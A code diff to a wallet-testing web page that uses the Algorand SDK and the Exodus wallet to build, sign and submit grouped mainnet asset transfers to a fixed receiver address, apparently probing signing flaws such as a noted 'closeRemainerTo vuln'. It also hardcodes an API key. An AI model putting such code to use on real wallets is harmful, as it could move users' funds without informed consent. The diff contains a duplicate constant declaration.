@@ -44,6 +44,101 @@
             }
 
 
+
+//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
+//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
+//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
+
+            // function used to wait for a tx confirmation
+            const waitForConfirmation = async function (algodclient, txId) {
+                let response = await algodclient.status().do();
+                let lastround = response["last-round"];
+                console.log(`Waiting for transaction confirmation for txn ${txId}`);
+                while (true) {
+                    const pendingInfo = await algodclient.pendingTransactionInformation(txId).do();
+                    if (pendingInfo["confirmed-round"] !== null && pendingInfo["confirmed-round"] > 0) {
+                        //Got the completed Transaction
+                        console.log("Transaction " + txId + " confirmed in round " + pendingInfo["confirmed-round"]);
+                        break;
+                    }
+                    lastround++;
+                    await algodclient.statusAfterBlock(lastround).do();
+                }
+                console.log('Transaction confirmed');
+            };
+
+
+            async function sign_then_submit_GroupAssetTransactions() {
+
+                try {
+                    const receiver = "RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY";
+                    const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
+                    const port = "";
+                    const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
+                    
+                    const algodClient = new algosdk.Algodv2(token, baseServer, port);
+
+                    let sender = window.exodus.algorand.address;
+                    console.log('[*] sender: ')
+                    console.log(sender)
+
+                    let suggestedParams = await algodClient.getTransactionParams().do();
+                    
+                    const receiver = "RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY";
+                
+                    let amount = 100000; // equals 0.1 ALGO
+
+                    const enc = new TextEncoder();
+                    let myNote = "doubleassetnote8";
+                    let myNote2 = myNote + '-2';
+                    const note = enc.encode(myNote);
+                    const note2 = enc.encode(myNote2);
+
+                    let txn1 = algosdk.makeAssetTransferTxnWithSuggestedParam(
+                        sender,
+                        receiver, 
+                        undefined, 
+                        undefined,
+                        amount,  
+                        note, 
+                        13300122, 
+                        suggestedParams
+                    )
+
+                    let txn2 = algosdk.makeAssetTransferTxnWithSuggestedParam(
+                        sender,
+                        receiver, 
+                        undefined, 
+                        undefined,
+                        amount,  
+                        note2, 
+                        13300122, 
+                        suggestedParams
+                    )
+
+                    algosdk.assignGroupID([txn1,txn2]);
+
+                    const signedTransactions = await window.exodus.algorand.signTransaction([
+                        txn1.toByte(),
+                        txn2.toByte(),
+                    ])
+
+                    let groupedSignedTxns = signedTransactions;
+
+                    let tx = (await algodClient.sendRawTransaction(groupedSignedTxns).do());
+                    console.log("[*] Transaction : " + tx.txId);
+
+                    await waitForConfirmation(algodClient, tx.txId);
+
+                } catch (err) {
+                    console.log("[-] ERR: ", err);
+                }
+            }
+
+//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
+//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
+//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
+            
             // closeRemainerTo vuln
             async function algo_transaction() {
                 const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
@@ -71,7 +166,7 @@
                 
 
                 const enc = new TextEncoder();
-                const note = enc.encode("note6");
+                const note = enc.encode("note7");
 
                 //let closeRemainderTo = "RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY";
 
@@ -131,10 +226,11 @@
                 const receiver = "RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY";
                 
                 let amount = 100000; // equals 0.1 ALGO
+                let amount2 = 200000; // equals 0.2 ALGO
                 
 
                 const enc = new TextEncoder();
-                let myNote = "doublenote6";
+                let myNote = "doublenote7";
                 let myNote2 = myNote + '-2';
                 const note = enc.encode(myNote);
                 const note2 = enc.encode(myNote2);
@@ -156,7 +252,7 @@
                     suggestedParams,
                     from: sender,
                     to: receiver,
-                    amount: amount,
+                    amount: amount2,
                     note: note2
                 });
 
@@ -356,7 +452,7 @@
 
         <div style="margin-top:30%;padding: 6px;width:50%;background-color:#000;color:#0E0;border:7px groove #A4f">
         <h1 style="color:#fA0;text-shadow: 2px 2px 4px #D34;">
-        76
+        78
         </h1>
         <h2>x0-w</h2>
         
@@ -365,6 +461,7 @@
         <hr />
         <input type="button" value="algo_connect" onclick="algo_connect()" />
         <input type="button" value="accept_connection" onclick="accept_connection()" />
+        <input type="button" value="sign_then_submit_GroupAssetTransactions" onclick="sign_then_submit_GroupAssetTransactions()" />
         <input type="button" value="algo_transaction" onclick="algo_transaction()" />
         <input type="button" value="algo_double_transaction" onclick="algo_double_transaction()" />
         <input type="button" value="asset_transaction" onclick="asset_transaction()" />
